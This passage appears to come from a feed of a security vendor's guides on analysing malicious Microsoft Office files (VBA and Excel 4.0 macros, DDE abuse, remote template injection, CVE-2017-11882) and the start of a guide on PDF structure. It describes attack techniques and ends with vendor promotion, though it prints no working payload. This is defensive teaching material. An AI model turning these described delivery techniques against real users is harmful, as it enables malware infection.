+&lt;a href="https://securelist.com/wirtes-campaign-in-the-middle-east-living-off-the-land-since-at-least-2019/105044/"target="_blank" rel="noopener"&gt;2021 attack&lt;/a&gt;
+documented by Kaspersky Lab, a threat actor sent spear phishing emails luring
+victims to open a malicious Microsoft Excel file. The file used
+&lt;a href="https://support.microsoft.com/en-us/office/working-with-excel-4-0-macros-ba8924d4-e157-4bb2-8d76-2c07ff02e0b8"target="_blank" rel="noopener"&gt;Excel 4.0 macros&lt;/a&gt;,
+which is an older version of macros used to automate tasks in Excel. The macros
+are hidden in empty cells and spreadsheets so that when the file is opened,
+malware is downloaded and executed.&lt;/p&gt;
+&lt;p&gt;Another type of attack method is based on remote &lt;code&gt;.dotm&lt;/code&gt;
+&lt;a href="http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html"target="_blank" rel="noopener"&gt;template file injection&lt;/a&gt;.
+If an attacker creates a &lt;code&gt;.docx&lt;/code&gt; file and convinces the victim to open the file
+and press &lt;em&gt;enable content&lt;/em&gt;, the file will load a malicious template file from a
+remote location that executes malware. While the &lt;code&gt;.docx&lt;/code&gt; doesn&amp;rsquo;t contain the
+macro code itself, the content of the file leads to execution of the macro.&lt;/p&gt;
+&lt;h3&gt;How do I detect and analyze malicious Office macros?&lt;span class="hx:absolute hx:-mt-20" id="how-do-i-detect-and-analyze-malicious-office-macros"&gt;&lt;/span&gt;
+&lt;a href="#how-do-i-detect-and-analyze-malicious-office-macros" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Let&amp;rsquo;s analyze this doc file: MD5: &lt;strong&gt;&lt;code&gt;167949ba90da85c8b56878d95be19c1a&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;First, we can run the
+&lt;a href="https://github.com/decalage2/oletools/blob/master/oletools/doc/oleid.md"target="_blank" rel="noopener"&gt;&lt;code&gt;oleid&lt;/code&gt;&lt;/a&gt;
+tool as described in the previous section. Once we establish that the file
+contains a VBA macro, we can use the
+&lt;a href="https://github.com/decalage2/oletools/blob/master/oletools/olevba.py#:~:text=olevba%20is%20a%20script%20to,in%20Excel%20and%20SLK%20files."target="_blank" rel="noopener"&gt;&lt;code&gt;olevba&lt;/code&gt;&lt;/a&gt;
+utility to get more information about the VBA and view the code of the macro.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/office/images/fig4.png" title="Oleid output for an OLE file." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Oleid output for an OLE file.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/office/images/fig5.png" title="Part of the output of olevba." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Part of the output of olevba.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Now, we need to analyze the code of the macro to understand if the file is
+malicious (macros can also be used for legitimate reasons). To get the streams
+in the file which contain the code of the VBA macro, you can either unzip the
+document file and open the file that contains the macro (&lt;code&gt;olevba&lt;/code&gt; identifies
+the file name), or use
+&lt;a href="https://blog.didierstevens.com/programs/oledump-py/"target="_blank" rel="noopener"&gt;&lt;code&gt;oledump&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The VBA code in malicious Microsoft Office files is frequently obfuscated, and
+it may look similar to the image below. Attackers will obfuscate a macro&amp;rsquo;s code
+to make it harder and more time-consuming for antiviruses and malware analysts
+to understand what the code is doing. Attackers use several techniques
+including:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Encrypting strings and API calls (usually using Base64)&lt;/li&gt;
+&lt;li&gt;Adding random characters to obfuscate strings and API functions&lt;/li&gt;
+&lt;li&gt;Mangling the names of functions and variables&lt;/li&gt;
+&lt;li&gt;Using shellcode to execute malicious functions&lt;/li&gt;
+&lt;li&gt;Dynamically defining functions&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://medium.com/walmartglobaltech/vba-stomping-advanced-maldoc-techniques-612c484ab278"target="_blank" rel="noopener"&gt;VBA stomping&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/office/images/fig6.png" title="Obfuscated VBA macro shown in olevba output." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Obfuscated VBA macro shown in olevba output.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;There are two ways to deobfuscate the code:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Statically - manually resolve the obfuscated code. You can use the &lt;code&gt;--decode&lt;/code&gt;
+argument in &lt;code&gt;olevba&lt;/code&gt; which will attempt to decode the VBA code&lt;/li&gt;
+&lt;li&gt;Dynamically - run the code in a sandbox or emulator such as
+&lt;a href="https://github.com/kirk-sayre-work/ViperMonkey"target="_blank" rel="noopener"&gt;ViperMonkey&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;While the main disadvantage of static malware analysis is that it can be
+time-consuming, dynamic analysis can sometimes fail to detect certain
+techniques and malicious Office documents.&lt;/p&gt;
+&lt;p&gt;After deobfuscating the code, you will have a better understanding of what the
+attacker is trying to achieve. Usually, they start PowerShell and run commands
+to gather information about the system, and download a malicious payload from a
+remote host to begin the next stage of the attack.&lt;/p&gt;
+&lt;h2&gt;Abusing Windows Dynamic Data Exchange (DDE)&lt;span class="hx:absolute hx:-mt-20" id="abusing-windows-dynamic-data-exchange-dde"&gt;&lt;/span&gt;
+&lt;a href="#abusing-windows-dynamic-data-exchange-dde" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;This technique is documented in MITRE ATT&amp;amp;CK®
+&lt;a href="https://attack.mitre.org/techniques/T1559/002/"target="_blank" rel="noopener"&gt;T1559&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;DDE is a protocol that is used to share data between Microsoft Office
+applications. Object Linking and Embedding (OLE), the ability to share data
+between documents, was implemented using this protocol. This protocol gives
+attackers the ability to execute different commands including being able to
+download additional malicious payloads. This method can be used both in OLE and
+OOXML files.&lt;/p&gt;
+&lt;p&gt;Newer versions of Office applications alert users when a document is attempting
+to execute a DDE command. Attackers have since crafted their phishing emails to
+trick victims into ignoring these alerts, allowing the execution of malicious
+code. This method is widely used by threat actors including
+&lt;a href="https://securityaffairs.co/wordpress/65318/hacking/dde-attack-apt28.html"target="_blank" rel="noopener"&gt;APT28&lt;/a&gt;
+and
+&lt;a href="https://www.trendmicro.com/en_us/research/21/d/carbanak-and-fin7-attack-techniques.html"target="_blank" rel="noopener"&gt;FIN7&lt;/a&gt;.&lt;/p&gt;
+&lt;h3&gt;How to detect and analyze Windows files that use Dynamic Data Exchange&lt;span class="hx:absolute hx:-mt-20" id="how-to-detect-and-analyze-windows-files-that-use-dynamic-data-exchange"&gt;&lt;/span&gt;
+&lt;a href="#how-to-detect-and-analyze-windows-files-that-use-dynamic-data-exchange" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;To detect files that use DDE, you can scan the strings of the file and look for
+keywords such as &lt;code&gt;DDEAUTO&lt;/code&gt; or &lt;code&gt;DDE&lt;/code&gt;. This can be time-consuming and some
+strings might be missed. To make the process easier, you can use
+&lt;a href="https://blog.nviso.eu/2017/10/11/detecting-dde-in-ms-office-documents/"target="_blank" rel="noopener"&gt;YARA rules&lt;/a&gt;
+that are designed to identify keywords and features used by DDE. Using the
+&lt;a href="https://blog.didierstevens.com/2017/07/19/updatezipdump-py-version-0-0-11/"target="_blank" rel="noopener"&gt;&lt;code&gt;zipdump&lt;/code&gt;&lt;/a&gt;
+utility also lets you run YARA rules to examine the content of ZIP files.&lt;/p&gt;
+&lt;p&gt;Another tool that can be used for detecting files that use DDE is
+&lt;a href="https://github.com/decalage2/oletools/blob/master/oletools/msodde.py"target="_blank" rel="noopener"&gt;&lt;code&gt;msodde&lt;/code&gt;&lt;/a&gt;
+from oletools. A file that uses this infection method will have an output
+similar to the following image.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/office/images/fig7.png" title="Output of msodde." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Output of msodde.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;In this example, the malicious Office document will download an HTML (&lt;code&gt;.hta&lt;/code&gt;)
+file from a remote server. It is common for malicious Microsoft Office files to
+download this type of file and they usually contain JavaScript code that will
+download the payload for the next stage in the attack.&lt;/p&gt;
+&lt;h2&gt;Abusing .rels - Template Injection&lt;span class="hx:absolute hx:-mt-20" id="abusing-rels---template-injection"&gt;&lt;/span&gt;
+&lt;a href="#abusing-rels---template-injection" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;This technique is described in MITRE ATT&amp;amp;CK®
+&lt;a href="https://attack.mitre.org/techniques/T1221/"target="_blank" rel="noopener"&gt;T1221&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;OOXML files are ZIP archives composed of XML (&lt;code&gt;.rels&lt;/code&gt;) files containing
+properties that define how the document is constructed. The properties can
+refer to parts that are stored in the archive file, on the local machine, or on
+a remote resource via URLs. Attackers can use this feature to conceal malicious
+code by storing it on a remote server and to avoid detection by standard EDRs
+because the Office document itself doesn&amp;rsquo;t contain malicious code. There are
+many types of properties that can be used, one of them being the template.&lt;/p&gt;
+&lt;p&gt;A
+&lt;a href="https://www.proofpoint.com/uk/blog/threat-insight/injection-new-black-novel-rtf-template-inject-technique-poised-widespread"target="_blank" rel="noopener"&gt;report&lt;/a&gt;
+from Proofpoint explains a novel technique that uses RTF template injection
+being exploited by several Advanced Persistent Threat (APT) groups. RTF files
+include their properties as plain text strings. Attackers can modify the
+location of the &lt;code&gt;*template&lt;/code&gt; property within a decoy RTF file to refer to a
+malicious script that is loaded once the RTF file is opened.&lt;/p&gt;
+&lt;h3&gt;Detect and analyze files with template injection&lt;span class="hx:absolute hx:-mt-20" id="detect-and-analyze-files-with-template-injection"&gt;&lt;/span&gt;
+&lt;a href="#detect-and-analyze-files-with-template-injection" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Running &lt;code&gt;oleid&lt;/code&gt; can help you focus your attention on a certain technique that
+was possibly used in the document. Let&amp;rsquo;s analyze this &lt;code&gt;.docx&lt;/code&gt; file: &lt;strong&gt;MD5:
+&lt;code&gt;8d1ce6280d2f66ff3e4fe1644bf24247&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/office/images/fig8.png" title="Output of oleid." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Output of oleid.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Using the
+&lt;a href="https://github.com/decalage2/oletools/blob/master/oletools/oleobj.py"target="_blank" rel="noopener"&gt;&lt;code&gt;oleobj&lt;/code&gt;&lt;/a&gt;
+utility you can get the references used in this document. The output of the
+command is shown below:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/office/images/fig9.png" title="Output of oleobj." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Output of oleobj.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;This document downloads a temple file (&lt;code&gt;.dot&lt;/code&gt;) from a domain that belongs to an
+APT group called Gamaredon. By analyzing these files, you can make a clear
+attribution and you also have more IoCs (including the domain and the payload)
+to further the investigation.&lt;/p&gt;
+&lt;h2&gt;Known Vulnerabilities in Office files&lt;span class="hx:absolute hx:-mt-20" id="known-vulnerabilities-in-office-files"&gt;&lt;/span&gt;
+&lt;a href="#known-vulnerabilities-in-office-files" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Known vulnerabilities of Office products are patched by Microsoft all the time.
+However, many organizations still don&amp;rsquo;t patch their software, making it
+possible for attackers to exploit vulnerabilities that are several years old.
+CISA and the FBI issued a
+&lt;a href="https://www.cisa.gov/uscert/ncas/alerts/aa20-133a"target="_blank" rel="noopener"&gt;2020 security alert&lt;/a&gt;
+describing three vulnerabilities related to Microsoft&amp;rsquo;s OLE technology being
+exploited by state-sponsored actors. These vulnerabilities were
+&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882"target="_blank" rel="noopener"&gt;CVE-2017-11882&lt;/a&gt;,
+&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2017-0199"target="_blank" rel="noopener"&gt;CVE-2017-0199&lt;/a&gt;, and
+&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1641"target="_blank" rel="noopener"&gt;CVE-2015-1641&lt;/a&gt;. HP
+&lt;a href="https://threatresearch.ext.hp.com//srv/htdocs/wp-content/uploads/2021/03/HP_Bromium_Threat_Insights_Report_Q4_2020.pdf"target="_blank" rel="noopener"&gt;researchers&lt;/a&gt;
+said that the most frequently exploited vulnerability in 2020 was
+CVE-2017-11882.&lt;/p&gt;
+&lt;p&gt;In
+&lt;a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-215a"target="_blank" rel="noopener"&gt;CISA&amp;rsquo;s 2023 security alert&lt;/a&gt;,
+CVE-2017-11882 &lt;em&gt;still&lt;/em&gt; earned spot on the list of routinely exploited
+vulnerabilities. When successfully exploited, attackers have the ability to
+execute arbitrary code after the user opens a document containing the exploit.&lt;/p&gt;
+&lt;h3&gt;Detect and analyze vulnerabilities in Microsoft Office&lt;span class="hx:absolute hx:-mt-20" id="detect-and-analyze-vulnerabilities-in-microsoft-office"&gt;&lt;/span&gt;
+&lt;a href="#detect-and-analyze-vulnerabilities-in-microsoft-office" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;When it comes to files that exploit vulnerabilities, it can be hard to identify
+and analyze the payload to determine if the file is malicious and what threat
+it poses.&lt;/p&gt;
+&lt;p&gt;For example, &lt;strong&gt;CVE-2017-11882&lt;/strong&gt; contains a buffer overflow vulnerability in
+Microsoft Equation Editor that enables attackers to execute arbitrary code once
+the victim opens a specially crafted document. You should look for an OLE
+equation object containing shellcode and inspect it thoroughly. But even if
+there is a suspicious payload, it needs to be executed in a sandbox in order to
+determine what the shellcode does.&lt;/p&gt;
+&lt;p&gt;We have presented several tools and utilities that can be used to analyze
+Office files. Different file types and payloads sometimes require different
+tools. In other cases, the file needs to be opened in order to allow the
+execution of commands and shellcodes so that the investigator understands which
+malware or threat is delivered in the document. Moreover, some attacks contain
+several stages. Each stage will deliver another weaponized file.&lt;/p&gt;
+&lt;p&gt;The bottom line is analyzing malicious Microsoft Office files can be
+time-consuming and requires both experience and an understanding of the
+different formats. While it is worth understanding the process, you can save
+valuable time while responding to incidents if you can avoid manual analysis
+(especially as part of your alert triage process).&lt;/p&gt;
+&lt;h2&gt;Automation for Analyzing Malicious Microsoft Office Files&lt;span class="hx:absolute hx:-mt-20" id="automation-for-analyzing-malicious-microsoft-office-files"&gt;&lt;/span&gt;
+&lt;a href="#automation-for-analyzing-malicious-microsoft-office-files" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;First, let&amp;rsquo;s look at how Intezer can help you with analysis of specific,
+individual files for when you need to dig deep. Then we&amp;rsquo;ll look at automating
+analysis of &lt;em&gt;every incoming file&lt;/em&gt; from your alert sources with Intezer, like
+you&amp;rsquo;d want to do for triaging alerts.&lt;/p&gt;
+&lt;p&gt;Intezer&amp;rsquo;s
+&lt;a href="https://intezer.com/forensic-ai-soc/"target="_blank" rel="noopener"&gt;powerful malware analysis engine&lt;/a&gt; can
+help you speed up the process of classifying and analyzing files. To get
+started, upload &lt;strong&gt;any&lt;/strong&gt; type of Microsoft Office document to Intezer like you
+would with
+&lt;a href="https://intezer.com/blog/alert-triage/the-evolution-of-sandboxing/"target="_blank" rel="noopener"&gt;a traditional sandbox&lt;/a&gt;.
+The analysis will provide you with a trusted or malicious verdict. If the file
+is malicious, Intezer will also tell you what malware family it belongs to. The
+information provided in the analysis report gives investigators an immediate
+understanding of the type of threat they are dealing with, its capabilities,
+and relevant IoCs for threat intelligence teams.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s analyze the file we examined earlier containing VBA macros. Instead of
+spending time cracking the obfuscated code, the analysis report gives you a
+malicious verdict and classifies the malware as AsyncRAT.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/office/images/fig10.png" title="Intezer&amp;#39;s analysis of a document containing VBA macros." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Intezer&amp;#39;s analysis of a document containing VBA macros.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Clicking on TTPs will reveal the techniques and capabilities used by the file as
+well as the malware that was executed afterwards. This file is capable of
+executing scripts and installing itself to automatically run upon Windows
+startup, among other capabilities.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/office/images/fig11.png" title="TTPs tab in Intezer&amp;#39;s analysis." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;TTPs tab in Intezer&amp;#39;s analysis.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;We can also get IoCs from the analysis and details about the network
+connections made by the file. Network IoCs can be used to hunt for other files
+in the system in case the threat actor has compromised other endpoints.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/office/images/fig12.png" title="IoCs reveal the IP addresses and domains used by the malware along with hashes of the files that are downloaded by the Word document." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;IoCs reveal the IP addresses and domains used by the malware along with hashes of the files that are downloaded by the Word document.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Behavior provides a deeper level of the capabilities for this threat. Here you&amp;rsquo;d
+see the content of the Word document file. In some cases, this can help you
+understand who was the targeted end user and what action led to the execution
+of code. Below is a process tree, beginning with opening the Microsoft Word
+file and leading to malware execution. This gives you a full picture of the
+programs and processes that are used by this threat. Next, you can see lists of
+files and registry keys that are used by the malware. This data can be used for
+further investigation of the compromised endpoint and to hunt for similar
+threats.&lt;/p&gt;
+&lt;p&gt;This can save you time if you have a single file that you need to investigate,
+but if you have a lot of files to analyze every day
+(&lt;a href="https://intezer.com/reported-phishing/"target="_blank" rel="noopener"&gt;like attachments from reported phishing emails&lt;/a&gt;)
+then you&amp;rsquo;ll need something that can ingest and analyze a large volume of
+incoming files.&lt;/p&gt;
+&lt;h2&gt;Automating triage and analysis of Microsoft Office files&lt;span class="hx:absolute hx:-mt-20" id="automating-triage-and-analysis-of-microsoft-office-files"&gt;&lt;/span&gt;
+&lt;a href="#automating-triage-and-analysis-of-microsoft-office-files" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;If you have a high volume of alerts with suspicious files, it&amp;rsquo;s best to avoid
+uploading and investigating individual files whenever possible. Particularly as
+part of their alert triage process, security teams typically have far too many
+files to analyze manually in a sandbox.&lt;/p&gt;
+&lt;p&gt;Intezer&amp;rsquo;s alert triage processes are built to &lt;strong&gt;automate tasks such as
+collecting and analyzing evidence like Office files from your alerts.&lt;/strong&gt; Intezer
+can also
+&lt;a href="https://intezer.com/blog/alert-triage/automated-endpoint-scanning-advanced-triage/"target="_blank" rel="noopener"&gt;analyze fileless threats&lt;/a&gt;
+or
+&lt;a href="https://intezer.com/blog/alert-triage/ai-insights-revolutionizing-threat-analysis/"target="_blank" rel="noopener"&gt;macros and scripts like PowerShell or Javascript&lt;/a&gt;,
+automatically giving you deeper insights about what an attacker was attempting
+to do next.&lt;/p&gt;
+&lt;p&gt;Here&amp;rsquo;s a look at how Intezer&amp;rsquo;s analysis and triage process works:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/office/images/fig13.png" title="How Intezer analyzes and triages files and alerts" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;How Intezer analyzes and triages files and alerts&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;If you&amp;rsquo;re already using a SOAR tool to collect alerts, Intezer can also provide
+your team with higher-quality analysis results while
+&lt;a href="https://intezer.com/blog/alert-triage/leveraging-intezers-smart-decision-making-in-your-soar/"target="_blank" rel="noopener"&gt;simplifying your SOAR playbooks for alert triage&lt;/a&gt;.
+Ultimately, responding quickly to serious incidents requires an advanced
+platform designed to
+&lt;a href="https://intezer.com/pricing/"target="_blank" rel="noopener"&gt;automatically collect evidence, investigate, triage alerts, and escalate only the confirmed threats.&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;As we looked at in this blog, Microsoft Office files are frequently used by
+attackers to deliver malware to endpoints. Attackers leverage both the
+different file formats and vulnerabilities in Office products to launch
+malicious commands that will eventually lead to malware. Often, the malicious
+functionality is hidden or obfuscated, making the analysis more difficult and
+lengthy.&lt;/p&gt;
+&lt;p&gt;We presented several open-source tools that can help investigators analyze
+individual Office files, but in more advanced cases the process can be
+especially time-consuming. To speed up the investigation and classification of
+Office files, you can
+&lt;a href="https://intezer.com/forensic-ai-soc/"target="_blank" rel="noopener"&gt;upload specific files to Intezer&lt;/a&gt; to
+instantly get a full analysis report or
+&lt;a href="https://intezer.com/forensic-ai-soc/"target="_blank" rel="noopener"&gt;connect your alert sources to automatically analyze files&lt;/a&gt;
+and triage all your alerts.&lt;/p&gt;
+&lt;div class="footnotes" role="doc-endnotes"&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id="fn:1"&gt;
+&lt;p&gt;OLE object is an object that supports the technology that allows sharing
+and linking between different files. For example, adding a spreadsheet to a
+Word document is made using these objects.&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink"&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;</description></item><item><title>PDF Files</title><link>https://research.intezer.com/docs/how-to-analyze/pdf/</link><pubDate>Wed, 01 Nov 2023 00:00:00 +0000</pubDate><guid>https://research.intezer.com/docs/how-to-analyze/pdf/</guid><description>
+&lt;p&gt;Portable Document Format (PDF) files are a cross-platform file format that
+supports links, images, and fonts. The flexibility of the PDF format makes
+these files very useful and widely used by individuals and organizations all
+over the world. At the same time, this format is very appealing for cyber
+criminals, as they can create valid looking PDF documents that will deliver
+malicious code or trick users into clicking links. A
+&lt;a href="https://cofense.com/blog/2023-cofense-phishing-intelligence-trends-review-q2/#:~:text=PDF%20documents%20represented%20the%20most%20common%20malicious%20choice%20for%20threat%20actors%20representing%2042.4%25%20of%20all%20total%20malicious%20file%20attachments."target="_blank" rel="noopener"&gt;2023 report&lt;/a&gt;
+found PDFs were the most commonly attached malicious file type for phishing
+emails.&lt;/p&gt;
+&lt;p&gt;Many attacks start from a received file, usually attached to a phishing email.
+Then once the victim opens the file or interacts with it by clicking on links
+or buttons, the next stage of the attack is executed. The purpose of the attack
+can be information stealing, installing a backdoor, gaining access to the
+system, and more.&lt;/p&gt;
+&lt;p&gt;One of the challenges of incident responders is to identify and classify the
+malicious files that were used in the attack that compromised the endpoint. PDF
+files make the process more time consuming because PDF files can carry
+malicious code that is hidden and compressed inside the streams of the file,
+all while these files are widely used for legitimate business both internally
+and externally in organizations. On top of that, alert fatigue can be a cause
+of missed alerts and increase the response time of new files to analyze.&lt;/p&gt;
+&lt;p&gt;In this article, we will describe the PDF format and how it can be abused to
+deliver malware. Then we will show how you can identify and detect a malicious
+PDF file using open-source and free tools. At the end we&amp;rsquo;ll look at how you can
+automatically collect and analyze PDFs for ongoing alert triage.&lt;/p&gt;
+&lt;h2&gt;What is the PDF File Format?&lt;span class="hx:absolute hx:-mt-20" id="what-is-the-pdf-file-format"&gt;&lt;/span&gt;
+&lt;a href="#what-is-the-pdf-file-format" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The PDF format was created by Adobe in 1993, as a text-based structure that
+gives users a reliable way to present documents regardless of the operating
+system and the software they are using. Besides text, PDF files can present a
+wide variety of content such as images, links, video files, 3D objects,
+editable forms and much more. Many products include features to download or
+&amp;ldquo;save as PDF&amp;rdquo;, allowing users to edit the content in another format
+(&lt;a href="../office/"&gt;like Microsoft Office files&lt;/a&gt;) before creating the PDF.&lt;/p&gt;
+&lt;p&gt;The PDF structure is hierarchical and contains four main parts:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Header&lt;/strong&gt; - Specifies the version number of the PDF.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;The body&lt;/strong&gt; - The document&amp;rsquo;s part that holds all of the information
+including text and other elements such as images, links, etc.&lt;/p&gt;
+&lt;p&gt;The body of the PDF file contains different objects which can reference each
+other, the objects have different types:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Names - &lt;code&gt;/name&lt;/code&gt; backslash followed by ASCII characters - setting a unique
+name.&lt;/li&gt;
+&lt;li&gt;Strings - &lt;code&gt;(text)&lt;/code&gt; its full syntax is a bit complex but what&amp;rsquo;s important is
+to know that it is enclosed in parentheses.&lt;/li&gt;
+&lt;li&gt;Arrays - enclosed with square brackets &lt;code&gt;([...])&lt;/code&gt; can contain other
+objects.&lt;/li&gt;
+&lt;li&gt;Dictionaries - table of key and value pairs. The key is a name object and
+the value can be any other object. Enclosed within double angle brackets
+&lt;code&gt;(&amp;lt;&amp;lt;...&amp;gt;&amp;gt;)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Streams - contains embedded data structures like images (or code) which
+can be compressed. Streams represented by a dictionary that set the
+stream&amp;rsquo;s length with the key &lt;code&gt;/Length&lt;/code&gt; and encoding &lt;code&gt;/Filters&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Indirect object - object that has a unique ID, the object starts with the
+keyboard &lt;code&gt;obj&lt;/code&gt; and ends with &lt;code&gt;endobj&lt;/code&gt; other objects can reference the
+object using its ID. For example a reference to object with ID 3 we would
+look like this: &lt;code&gt;3 0 R&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Cross-reference table&lt;/strong&gt; - Specifies the offset from the start of the file
+to each object in the file, so that the PDF reader will be able to locate
+them without loading the whole document (it can save time when opening big
+files).&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Trailer&lt;/strong&gt; - Specifies information about the cross-reference table so the
+PDF reader will be able to find the table and other objects. PDF readers
+start reading the file from the end, let&amp;rsquo;s look at the example below:&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;xref
+0 14
+0000000000 65535 f
+0000000015 00000 n
+0000000660 00000 n
+0000000803 00000 n
+0000001007 00000 n
+0000001322 00000 n
+0000001049 00000 n
+0000001410 00000 n
+0000001200 00000 n
+0000001461 00000 n
+0000001513 00000 n
+0000001573 00000 n
+0000001632 00000 n
+0000001737 00000 n
+trailer
+&amp;lt;&amp;lt;/Size 14/Root 12 0 R/Info 13 0 R/ID [&amp;lt;019e8b45c3227a3f8f35b7a9a09c2f70&amp;gt;&amp;lt;019e8b45c3227a3f8f35b7a9a09c2f70&amp;gt;]&amp;gt;&amp;gt;
+%iText-5.5.10
+startxref
+1901
+%%EOF&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;The first line (from the bottom) is &lt;code&gt;%%EOF&lt;/code&gt; above is the offset of the
+cross-reference table - 1901. Above that is the trailer that specifies
+different settings:&lt;/p&gt;
+&lt;ul&gt;
